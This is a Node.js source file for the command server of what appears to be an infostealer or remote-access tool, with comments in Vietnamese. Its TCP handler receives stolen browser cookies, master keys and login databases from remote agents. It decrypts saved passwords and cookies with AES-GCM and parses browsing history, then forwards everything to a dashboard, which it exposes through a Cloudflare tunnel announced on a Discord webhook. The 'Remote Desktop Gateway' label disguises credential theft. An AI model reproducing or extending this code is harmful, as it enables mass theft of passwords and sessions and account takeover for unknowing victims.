// --- Gateway: HTTP + WebSocket + TCP + UDP ---
const path = require("path");
const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const net = require("net");
const dgram = require("dgram");
const os = require("os");
const { spawn } = require("child_process");
const bodyParser = require("body-parser");
const Auth = require("./auth");
const crypto = require("crypto");
const fs = require("fs");
const initSqlJs = require('sql.js');

// --- Load config từ file config.env (nếu có) ---
function loadEnvConfig() {
    const isPkg = typeof process.pkg !== 'undefined';
    const basePath = isPkg ? path.dirname(process.execPath) : __dirname;
    const configPath = path.join(basePath, "config.env");
    
    if (fs.existsSync(configPath)) {
        console.log("[Config] Loading from config.env...");
        const content = fs.readFileSync(configPath, 'utf-8');
        content.split('\n').forEach(line => {
            line = line.trim();
            if (line && !line.startsWith('#')) {
                const [key, ...valueParts] = line.split('=');
                const value = valueParts.join('=').trim();
                if (key && value) {
                    process.env[key.trim()] = value;
                }
            }
        });
    }
}
loadEnvConfig();


let SQL = null;

// Cấu hình đường dẫn tuyệt đối tới file wasm
initSqlJs().then((S) => {
    SQL = S;
}).catch(err => console.error("⛔ [Init Error] Lỗi load SQL.js:", err));

// Hàm parse browser history từ SQLite DB (Chromium-based)
function parseBrowserHistory(historyDbB64, isFirefox = false, limit = 500) {
    if (!SQL) {
        console.log("SQL.js not ready yet.");
        return [];
    }

    let db = null;
    const results = [];
    try {
        const dbBuffer = Buffer.from(historyDbB64, 'base64');
        db = new SQL.Database(dbBuffer);

        let query;
        if (isFirefox) {
            // Firefox uses places.sqlite
            query = `SELECT url, title, visit_count, last_visit_date FROM moz_places 
                     WHERE url NOT LIKE 'place:%' 
                     ORDER BY last_visit_date DESC LIMIT ${limit}`;
        } else {
            // Chromium-based browsers
            query = `SELECT url, title, visit_count, last_visit_time FROM urls 
                     ORDER BY last_visit_time DESC LIMIT ${limit}`;
        }

        const stmt = db.prepare(query);
        while (stmt.step()) {
            const row = stmt.getAsObject();
            
            // Convert timestamp
            let visitTime;
            if (isFirefox) {
                // Firefox: microseconds since epoch
                visitTime = row.last_visit_date ? new Date(row.last_visit_date / 1000).toISOString() : null;
            } else {
                // Chromium: microseconds since Jan 1, 1601
                const chromiumEpoch = 11644473600000000n; // Microseconds
                const timestamp = BigInt(row.last_visit_time || 0);
                if (timestamp > 0) {
                    visitTime = new Date(Number((timestamp - chromiumEpoch) / 1000n)).toISOString();
                } else {
                    visitTime = null;
                }
            }

            results.push({
                url: row.url,
                title: row.title || "",
                visit_count: row.visit_count || 0,
                last_visit: visitTime
            });
        }
        stmt.free();
        return results;
    } catch (e) {
        console.log("Parse History Error:", e.message);
        return [];
    } finally {
        if (db) db.close();
    }
}

// --- CẤU HÌNH ---
const CFG = {
    HTTP_PORT: parseInt(process.env.HTTP_PORT || 8080),
    AGENT_PORT: parseInt(process.env.AGENT_PORT || 9100),
    BEACON_PORT: 9103,
    GATEWAY_ELECTION_PORT: 9104,
    TIMEOUT_MS: 30000,
    CLEANUP_MS: 60000,
    ELECTION_INTERVAL: 2000,
    LEADER_TIMEOUT: 6000,
    
    // === CẤU HÌNH GỬI LINK CLOUDFLARE ===
    DISCORD_WEBHOOK_URL: process.env.DISCORD_WEBHOOK_URL || ""
};

// --- QUẢN LÝ ---
const agents = new Map();
let webClient = null;

// === GATEWAY LEADER ELECTION ===
const GATEWAY_ID = `${os.hostname()}_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;
let isLeader = false;
let currentLeader = null;
let otherGateways = new Map(); // Map<gatewayId, {ip, port, lastSeen, startTime}>
let electionUdp = null;
let tunnelStarted = false;

console.log(`[Gateway] ID: ${GATEWAY_ID}`);

// --- HELPER: LỌC COOKIE (NEW) ---
// Hàm này loại bỏ cookie trùng lặp, chỉ giữ cái mới nhất
function filterBestCookies(cookies) {
    if (!Array.isArray(cookies)) return [];
    const map = new Map();

    cookies.forEach(c => {
        // Tạo khóa duy nhất: Domain + Name
        const key = `${c.domain}__${c.name}`;
        
        if (map.has(key)) {
            const existing = map.get(key);
            // So sánh hạn sử dụng: Giữ cái nào sống lâu hơn
            const newExpiry = c.expirationDate || c.expires || 0;
            const oldExpiry = existing.expirationDate || existing.expires || 0;

            if (newExpiry > oldExpiry) {
                map.set(key, c);
            }
        } else {
            map.set(key, c);
        }
    });

    return Array.from(map.values());
}

const getLanIP = () => {
    for (const nets of Object.values(os.networkInterfaces())) {
        for (const net of nets) {
            if (net.family === "IPv4" && !net.internal) return net.address;
        }
    }
    return "127.0.0.1";
};

// === GATEWAY LEADER ELECTION SYSTEM ===
const GATEWAY_START_TIME = Date.now();

function initLeaderElection() {
    electionUdp = dgram.createSocket({ type: 'udp4', reuseAddr: true });
    
    electionUdp.on('message', (data, rinfo) => {
        try {
            const msg = JSON.parse(data.toString());
            if (msg.type !== 'gateway_election' || msg.gatewayId === GATEWAY_ID) return;
            
            // Cập nhật danh sách gateway khác
            otherGateways.set(msg.gatewayId, {
                ip: rinfo.address,
                port: msg.httpPort,
                agentPort: msg.agentPort,
                lastSeen: Date.now(),
                startTime: msg.startTime,
                isLeader: msg.isLeader
            });
            
            // Nếu có gateway khác claim là leader và khởi động sớm hơn
            if (msg.isLeader && msg.startTime < GATEWAY_START_TIME) {
                if (isLeader) {
                    console.log(`[Election] Found older leader: ${msg.gatewayId}, stepping down...`);
                    becomeFollower(msg.gatewayId);
                }
                currentLeader = msg.gatewayId;
            }
        } catch (e) {}
    });
    
    electionUdp.on('error', (e) => {
        console.log(`[Election] UDP Error: ${e.message}`);
    });
    
    electionUdp.bind(CFG.GATEWAY_ELECTION_PORT, '0.0.0.0', () => {
        electionUdp.setBroadcast(true);
        console.log(`[Election] Listening on port ${CFG.GATEWAY_ELECTION_PORT}`);
        
        // Gửi heartbeat định kỳ
        setInterval(sendElectionHeartbeat, CFG.ELECTION_INTERVAL);
        
        // Kiểm tra leader timeout
        setInterval(checkLeaderStatus, CFG.ELECTION_INTERVAL);
        
        // Bắt đầu election sau 3 giây (chờ nghe các gateway khác)
        setTimeout(startElection, 3000);
    });
}

function sendElectionHeartbeat() {
    const msg = JSON.stringify({
        type: 'gateway_election',
        gatewayId: GATEWAY_ID,
        hostname: os.hostname(),
        ip: getLanIP(),
        httpPort: CFG.HTTP_PORT,
        agentPort: CFG.AGENT_PORT,
        startTime: GATEWAY_START_TIME,
        isLeader: isLeader,
        agentCount: agents.size
    });
    
    electionUdp.send(msg, 0, msg.length, CFG.GATEWAY_ELECTION_PORT, '255.255.255.255');
}

function checkLeaderStatus() {
    const now = Date.now();
    
    // Cleanup gateway không còn heartbeat
    otherGateways.forEach((gw, id) => {
        if (now - gw.lastSeen > CFG.LEADER_TIMEOUT) {
            console.log(`[Election] Gateway ${id} timed out`);
            otherGateways.delete(id);
            
            // Nếu leader timeout, bắt đầu election mới
            if (currentLeader === id) {
                console.log(`[Election] Leader timed out! Starting new election...`);
                currentLeader = null;
                startElection();
            }
        }
    });
}

function startElection() {
    // Tìm gateway khởi động sớm nhất (bao gồm cả chính mình)
    let oldestGateway = { id: GATEWAY_ID, startTime: GATEWAY_START_TIME };
    
    otherGateways.forEach((gw, id) => {
        if (gw.startTime < oldestGateway.startTime) {
            oldestGateway = { id, startTime: gw.startTime };
        }
    });
    
    if (oldestGateway.id === GATEWAY_ID) {
        becomeLeader();
    } else {
        currentLeader = oldestGateway.id;
        console.log(`[Election] Leader is: ${oldestGateway.id}`);
        becomeFollower(oldestGateway.id);
    }
}

function becomeLeader() {
    if (isLeader) return;
    
    isLeader = true;
    currentLeader = GATEWAY_ID;
    console.log(`\n${'='.repeat(50)}`);
    console.log(`[Election] 👑 THIS GATEWAY IS NOW THE LEADER!`);
    console.log(`${'='.repeat(50)}\n`);
    
    // Chỉ leader mới khởi động Cloudflare tunnel
    if (!tunnelStarted) {
        tunnelStarted = true;
        startTunnel();
    }
}

function becomeFollower(leaderId) {
    if (!isLeader) return;
    
    isLeader = false;
    currentLeader = leaderId;
    console.log(`\n[Election] 📡 Running as FOLLOWER (Leader: ${leaderId})`);
    console.log(`[Election] This gateway is on STANDBY mode\n`);
}

// --- 1. HTTP SERVER ---
const app = express();
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.json());

// --- KÍCH HOẠT AUTH MODULE ---
Auth.setup(app); // Cài đặt các route /api/register, /api/login

// --- ROUTING CHO LANDING PAGES ---
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "home.html"));
});

app.get("/features", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "features.html"));
});

app.get("/contact", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "contact.html"));
});

app.get("/dashboard", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

app.get("/api/scan", (_, res) => {
    const now = Date.now();
    const activeAgents = Array.from(agents.values())
        .filter(a => a.socket && !a.socket.destroyed && (now - a.lastSeen < CFG.TIMEOUT_MS))
        .map(a => ({
            agentId: a.id,
            ip: a.info.ip,
            hostname: a.info.hostname,
            os: a.info.os,
            lastSeen: a.lastSeen
        }));
    res.json({ success: true, data: activeAgents });
});

const server = http.createServer(app);

// --- 2. WEBSOCKET SERVER ---
const wss = new WebSocket.Server({ server, path: "/ws" });

wss.on("connection", (ws) => {
    if (webClient) { ws.close(1013, "Busy"); return; }
    webClient = ws;
    console.log("[Gateway] Web Client connected");

    ws.on("message", (raw) => {
        try {
            const msg = JSON.parse(raw);
            if (!msg.agentId) return ws.send(JSON.stringify({ type: "status", success: false, message: "Missing agentId" }));
            
            const agent = agents.get(msg.agentId);
            if (agent && agent.socket && !agent.socket.destroyed) {
                agent.socket.write(JSON.stringify(msg) + "\n");
            } else {
                ws.send(JSON.stringify({ type: "status", success: false, message: "Agent offline" }));
            }
        } catch (e) { console.error("[WS] Error:", e.message); }
    });

    ws.on("close", () => { if (webClient === ws) webClient = null; });
});

// --- 3. TCP SERVER (CORE LOGIC) ---
const tcpServer = net.createServer((socket) => {
    const id = socket.remoteAddress;
    socket.setEncoding("utf8");

    let agent = agents.get(id);
    if (agent?.socket) agent.socket.destroy();
    
    agent = { 
        id, socket, buffer: "", lastSeen: Date.now(),
        info: { ip: id, hostname: "Unknown", os: "Unknown" }
    };
    agents.set(id, agent);
    console.log(`[TCP] Agent connected: ${id}`);

    socket.on("data", (chunk) => {
        agent.buffer += chunk;
        agent.lastSeen = Date.now();

        let idx;
        while ((idx = agent.buffer.indexOf("\n")) !== -1) {
            const line = agent.buffer.slice(0, idx).trim();
            agent.buffer = agent.buffer.slice(idx + 1);
            if (!line) continue;

            try {
                const msg = JSON.parse(line);
                
                // === A. XỬ LÝ COOKIE TỪ CDP (QUAN TRỌNG NHẤT) ===
                if (msg.type === "cookies_result") {
                    const rawCount = msg.data ? msg.data.length : 0;
                    console.log(`[Gateway] Received ${rawCount} cookies from ${msg.browser}. Filtering...`);
                    
                    // LỌC COOKIE TRƯỚC KHI GỬI XUỐNG UI
                    if (rawCount > 0) {
                        msg.data = filterBestCookies(msg.data);
                        console.log(`[Gateway] Filtered: ${rawCount} -> ${msg.data.length} clean cookies.`);
                    }

                    if (webClient?.readyState === WebSocket.OPEN) {
                        msg.agentId = id;
                        webClient.send(JSON.stringify(msg));
                    }
                    continue; // Đã xử lý xong, không forward mặc định
                }

                // === B. XỬ LÝ COOKIE TỪ DB FILE (LEGACY) ===
                if (msg.type === "cookies_package_multi") {
                    console.log(`[Gateway] Processing DB Cookies from ${msg.browser}...`);
                    let allCookies = [];
                    for (const dbInfo of msg.dbs) {
                        const cookies = decryptCookies(msg.master_key, dbInfo.data);
                        if (cookies.length > 0) allCookies = allCookies.concat(cookies);
                    }
                    
                    // Lọc cả loại này luôn cho chắc
                    const cleanCookies = filterBestCookies(allCookies);

                    if (webClient?.readyState === WebSocket.OPEN) {
                        webClient.send(JSON.stringify({
                            type: "cookies_result",
                            browser: msg.browser,
                            data: cleanCookies
                        }));
                    }
                    continue;
                }

                // === C. XỬ LÝ PASSWORD AUTO (TẤT CẢ BROWSER) ===
                // Trong gateway.js
                // === THAY THẾ ĐOẠN NÀY ===
                if (msg.type === "passwords_auto_result") {
                    console.log(`[1] Nhận gói tin password. Số lượng browser: ${msg.browsers ? msg.browsers.length : 0}`);
                    
                    let allPasswords = [];
                    const browserList = msg.browsers || [];

                    // Duyệt từng Browser
                    for (let i = 0; i < browserList.length; i++) {
                        const browserData = browserList[i];
                        console.log(`[2] -> Đang xử lý browser: ${browserData.browser} (Index: ${i})`);

                        const dbs = browserData.dbs || [];
                        console.log(`[3]    -> Tìm thấy ${dbs.length} profile (DB files).`);

                        // Duyệt từng file DB
                        for (let j = 0; j < dbs.length; j++) {
                            const dbInfo = dbs[j];
                            
                            // [CHECK 1] Kiểm tra tên biến data hay content
                            let rawContent = dbInfo.content;
                            if (!rawContent) {
                                console.log(`[WARN] Không thấy .content, thử tìm .data...`);
                                rawContent = dbInfo.data;
                            }

                            // [CHECK 2] Kiểm tra dữ liệu có tồn tại không
                            if (!rawContent) {
                                console.error(`[ERROR] DB tại index ${j} bị RỖNG (undefined/null). Bỏ qua.`);
                                continue;
                            }

                            // [CHECK 3] Kiểm tra kích thước (Nếu > 50MB là treo chắc)
                            const sizeMB = rawContent.length / 1024 / 1024;
                            console.log(`[4]    -> DB [${j}] Size: ${sizeMB.toFixed(2)} MB.`);

                            if (sizeMB > 50) {
                                console.warn(`[SKIP] File quá lớn (>50MB), bỏ qua để tránh sập Server.`);
                                continue;
                            }

                            try {
                                console.log(`[5]    -> Gọi hàm decryptPasswords...`);
                                
                                // Gọi hàm giải mã
                                const passwords = decryptPasswords(browserData.master_key, rawContent);
                                
                                console.log(`[6]    -> Kết quả: Lấy được ${passwords.length} pass.`);
                                
                                // Gán tên browser
                                passwords.forEach(p => p.browser = browserData.browser);
                                allPasswords = allPasswords.concat(passwords);

                            } catch (err) {
                                console.error(`[CRASH] Lỗi khi giải mã DB [${j}]:`, err.message);
                            }
                        }
                    }

                    console.log(`[7] Tổng kết: ${allPasswords.length} mật khẩu. Đang gửi về Frontend...`);

                    if (webClient && webClient.readyState === WebSocket.OPEN) {
                        webClient.send(JSON.stringify({
                            type: "passwords_result",
                            browser: "All Browsers",
                            data: allPasswords,
                            warning: allPasswords.length === 0 ? "Decrypt OK but 0 passwords found." : null
                        }));
                        console.log(`[8] Đã gửi xong.`);
                    } else {
                        console.warn(`[WARN] WebClient chưa kết nối (F5 lại Dashboard).`);
                    }
                }

                // === E. XỬ LÝ BROWSER HISTORY ===
                if (msg.type === "browser_history" && msg.success && msg.historyDb) {
                    console.log(`[Gateway] Processing browser history from ${msg.browser}...`);
                    const history = parseBrowserHistory(msg.historyDb, msg.isFirefox, msg.limit || 500);
                    console.log(`[Gateway] Parsed ${history.length} history entries`);
                    
                    if (webClient?.readyState === WebSocket.OPEN) {
                        webClient.send(JSON.stringify({
                            type: "browser_history_result",
                            browser: msg.browser,
                            success: true,
                            data: history
                        }));
                    }
                    continue;
                }

                // === D. CÁC TIN KHÁC (FORWARD) ===
                if (msg.type === "hello") {
                    agent.info = { ...agent.info, hostname: msg.hostname, os: msg.os };
                    console.log(`[TCP] Registered: ${agent.info.hostname} (${id})`);
                } else if (msg.type !== "heartbeat") {
                    if (webClient?.readyState === WebSocket.OPEN) {
                        msg.agentId = id;
                        webClient.send(JSON.stringify(msg));
                    }
                }
            } catch (e) { /* Ignore JSON Error */ }
        }
    });

    socket.on("error", (e) => console.error(`[TCP] Error ${id}: ${e.message}`));
    socket.on("close", () => {
        console.log(`[TCP] Disconnect: ${id}`);
        // Xóa agent khỏi Map ngay khi disconnect để scan list cập nhật real-time
        agents.delete(id);
    });
});

tcpServer.listen(CFG.AGENT_PORT, "0.0.0.0", () => {
    console.log(`[Gateway] TCP listening on 0.0.0.0:${CFG.AGENT_PORT}`);
});

// --- 4. UDP BEACON (SCAN ON-DEMAND, LEADER ONLY) ---
const udp = dgram.createSocket("udp4");
let beaconInterval = null;
let beaconTimeout = null;

udp.bind(0, () => {
    udp.setBroadcast(true);
    console.log("[Gateway] UDP Beacon ready (on-demand mode)");
});

// Hàm bắt đầu gửi beacon trong khoảng thời gian nhất định
function startBeaconScan(durationMs = 10000) {
    // CHỈ LEADER MỚI ĐƯỢC GỬI BEACON
    if (!isLeader) {
        console.log("[Gateway] Not leader, skipping beacon scan");
        return false;
    }
    
    // Nếu đang scan rồi thì reset timer
    if (beaconTimeout) clearTimeout(beaconTimeout);
    
    // Nếu chưa có interval thì tạo mới
    if (!beaconInterval) {
        console.log("[Gateway] Starting beacon scan...");
        beaconInterval = setInterval(() => {
            const msg = JSON.stringify({ 
                type: "gateway_beacon", 
                hostname: os.hostname(), 
                ip: getLanIP(), 
                port: CFG.AGENT_PORT 
            });
            udp.send(msg, 0, msg.length, CFG.BEACON_PORT, "255.255.255.255");
        }, 500);
    }
    
    // Tự động dừng sau duration
    beaconTimeout = setTimeout(() => {
        stopBeaconScan();
    }, durationMs);
    
    return true;
}

function stopBeaconScan() {
    if (beaconInterval) {
        clearInterval(beaconInterval);
        beaconInterval = null;
        console.log("[Gateway] Beacon scan stopped");
    }
    if (beaconTimeout) {
        clearTimeout(beaconTimeout);
        beaconTimeout = null;
    }
}

// API để frontend trigger scan
app.post("/api/start-scan", (req, res) => {
    if (!isLeader) {
        return res.json({ 
            success: false, 
            message: "This gateway is not the leader. Only leader can scan for agents.",
            isLeader: false,
            currentLeader: currentLeader
        });
    }
    
    const duration = req.body?.duration || 10000;
    const started = startBeaconScan(duration);
    res.json({ 
        success: started, 
        message: started ? `Beacon scan started for ${duration/1000}s` : "Failed to start scan",
        isLeader: true
    });
});

app.post("/api/stop-scan", (_, res) => {
    stopBeaconScan();
    res.json({ success: true, message: "Beacon scan stopped" });
});

// API để kiểm tra trạng thái leader
app.get("/api/gateway-status", (_, res) => {
    const gatewayList = Array.from(otherGateways.entries()).map(([id, gw]) => ({
        id,
        ip: gw.ip,
        port: gw.port,
        isLeader: gw.isLeader,
        agentCount: gw.agentCount || 0
    }));
    
    res.json({
        success: true,
        gatewayId: GATEWAY_ID,
        isLeader: isLeader,
        currentLeader: currentLeader,
        otherGateways: gatewayList,
        agentCount: agents.size
    });
});

// --- CLEANUP ---
setInterval(() => {
    const now = Date.now();
    agents.forEach((a, id) => {
        if (now - a.lastSeen > CFG.CLEANUP_MS) {
            if (a.socket) a.socket.destroy();
            agents.delete(id);
        }
    });
}, CFG.CLEANUP_MS);

// --- DECRYPTION HELPERS ---
function decryptPasswords(masterKeyB64, dbFileB64) {
    // 1. Kiểm tra thư viện
    if (!SQL) { console.log("   [SQL] Lib not ready"); return []; }
    if (!dbFileB64) return [];

    try {
        const masterKey = Buffer.from(masterKeyB64, 'base64');
        const rawBuffer = Buffer.from(dbFileB64, 'base64');
        
        // 2. Ép kiểu sang Uint8Array (Bắt buộc với sql.js)
        const u8Array = new Uint8Array(rawBuffer);

        // === [SỬA LỖI TẠI ĐÂY] ===
        // SAI: db = new Database(u8Array);
        // ĐÚNG: Phải có chữ SQL. ở trước
        const db = new SQL.Database(u8Array); 
        // =========================

        const stmt = db.prepare("SELECT origin_url, username_value, password_value FROM logins");
        const results = [];

        while (stmt.step()) {
            const row = stmt.getAsObject();
            if (!row.password_value) continue;
            try {
                const buffer = Buffer.from(row.password_value);
                const prefix = buffer.slice(0, 3).toString('utf8');
                
                // Giải mã v10/v11 (AES-GCM)
                if (prefix === 'v10' || prefix === 'v11') {
                    const iv = buffer.slice(3, 15);
                    const ciphertext = buffer.slice(15, buffer.length - 16);
                    const tag = buffer.slice(-16);
                    
                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                    decipher.setAuthTag(tag);
                    const clear = decipher.update(ciphertext) + decipher.final('utf8');
                    
                    if (clear) results.push({ url: row.origin_url, user: row.username_value, pass: clear });
                }
            } catch(e) {}
        }
        stmt.free();
        db.close();
        return results;
    } catch (e) {
        console.error(`   [CRASH FIX] Lỗi chi tiết: ${e.message}`);
        return [];
    }
}

function decryptCookies(masterKeyB64, dbFileB64) {
    if (!SQL) return [];

    let db = null;
    const results = [];
    try {
        const masterKey = Buffer.from(masterKeyB64, 'base64');
        const dbBuffer = Buffer.from(dbFileB64, 'base64');

        db = new SQL.Database(dbBuffer);

        // Query lấy Cookies
        const stmt = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies");

        while(stmt.step()) {
            const row = stmt.getAsObject();
            if (!row.encrypted_value) continue;

            try {
                const buffer = Buffer.from(row.encrypted_value);
                const prefix = buffer.slice(0, 3).toString('utf8');
                let clearText;

                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
                    const iv = buffer.slice(3, 15);
                    const ciphertext = buffer.slice(15, buffer.length - 16);
                    const tag = buffer.slice(-16);

                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                    decipher.setAuthTag(tag);
                    clearText = decipher.update(ciphertext) + decipher.final('utf8');
                }

                if (clearText) {
                    results.push({
                        domain: row.host_key, name: row.name, value: clearText,
                        path: row.path, secure: !!row.is_secure,
                        expirationDate: (row.expires_utc / 1000000) - 11644473600
                    });
                }
            } catch(e) {}
        }
        stmt.free();
        return results;
    } catch (e) { return []; } 
    finally {
        if (db) db.close();
    }
}

// --- 5. CLOUDFLARE TUNNEL ---

// Hàm gửi link qua Discord Webhook
async function sendToDiscord(url) {
    if (!CFG.DISCORD_WEBHOOK_URL) return;
    
    try {
        const https = require('https');
        const { URL } = require('url');
        const webhookUrl = new URL(CFG.DISCORD_WEBHOOK_URL);
        
        const data = JSON.stringify({
            embeds: [{
                title: "🌐 Gateway Online!",
                color: 0x00ff00,
                fields: [
                    { name: "📍 Hostname", value: `\`${os.hostname()}\``, inline: true },
                    { name: "⏰ Time", value: new Date().toLocaleString(), inline: true },
                    { name: "🔗 Public URL", value: url }
                ],
                footer: { text: "Remote Desktop Gateway" }
            }]
        });
        
        const req = https.request(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        }, (res) => {
            if (res.statusCode === 204 || res.statusCode === 200) {
                console.log("[Discord] ✓ Link sent successfully!");
            } else {
                console.log(`[Discord] ✗ Failed: ${res.statusCode}`);
            }
        });
        
        req.on('error', (e) => console.log(`[Discord] ✗ Error: ${e.message}`));
        req.write(data);
        req.end();
    } catch (e) {
        console.log(`[Discord] ✗ Error: ${e.message}`);
    }
}

const startTunnel = () => {
    const isPkg = typeof process.pkg !== 'undefined';
    const basePath = isPkg ? path.dirname(process.execPath) : __dirname;
    const cfExe = path.join(basePath, "cloudflared.exe");

    console.log("[Tunnel] Starting Cloudflare...");
    const child = spawn(cfExe, ["tunnel", "--url", `http://127.0.0.1:${CFG.HTTP_PORT}`]);
    child.stderr.on("data", (d) => {
        const url = d.toString().match(/https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com/);
        if (url) {
            console.log(`\n>>> PUBLIC URL: ${url[0]} <<<\n`);
            // Gửi link về Discord
            sendToDiscord(url[0]);
        }
    });
    process.on("exit", () => child.kill()); 
};

// --- START ---
server.listen(CFG.HTTP_PORT, "0.0.0.0", () => {
    console.log(`[Gateway] UI: http://localhost:${CFG.HTTP_PORT}`);
    console.log(`[Gateway] TCP Listening: ${CFG.AGENT_PORT}`);

    Auth.startCLI(); 
    
    // Khởi động Leader Election (sẽ tự động start tunnel nếu là leader)
    initLeaderElection();
});